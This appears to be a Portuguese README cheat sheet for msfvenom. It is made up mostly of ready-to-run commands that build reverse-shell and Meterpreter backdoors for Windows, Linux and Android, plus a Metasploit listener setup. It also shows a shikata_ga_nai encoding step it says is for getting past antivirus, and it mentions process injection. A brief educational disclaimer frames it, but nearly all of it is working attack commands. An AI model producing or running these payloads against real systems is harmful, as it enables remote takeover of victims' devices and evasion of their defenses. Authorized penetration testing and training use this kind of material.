![Banner Dark Tech](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExOWp2N2VqenUxM3N6czhvOWIxb244eTBuZ2tsYXdnbW9mbTdmc3QzYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/SirUFDS5F83Go/giphy.gif)

# 🖥️ MSFVenom
`Status: Online` | `Environment: Ubuntu 22.04 LTS` | `Security: Active`

# 🚀 MSFVenom: Arsenal de Payloads 
> **Aviso:** Este material tem fins estritamente educativos. O uso em sistemas sem autorização é ilegal.

Este guia uso como consulta rápida para geração de payloads e gerenciamento de conexões reversas.

---

## 🛠️ Comandos Fundamentais

### 1. Windows (x64) - Reverse TCP
Gera um executável (.exe) para sistemas modernos de 64 bits.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f exe -o backdoor.exe
```
### 2. Linux (x64) - Reverse Shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f elf -o shell.elf
```
### 3. Android - Meterpreter APK
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<SEU_IP> LPORT=4444 -o malware.apk
```
### 🎧 Handler (Ouvinte)
```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp  # Deve ser igual ao payload gerado
set LHOST <SEU_IP>
set LPORT 4444
run
```
### Encoder Shikata Ga Nai:
Para tentar passar por antivírus simples, uso Encoders ou Iterações
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

> **Aviso:** (Nota: No Windows 10/11 atualizado, encoders simples podem ser detectados. Para esses casos, uso técnicas de injeção em processos legítimos).

### 📑 Glossário de Parâmetros

-p: Payload (O que será executado no alvo).

LHOST: Local Host (O IP da sua máquina atacante).

LPORT: Local Port (A porta que você abrirá no seu Kali).

-f: Format (Extensão do arquivo: exe, elf, apk, raw, python).

-o: Output (Nome do arquivo final).
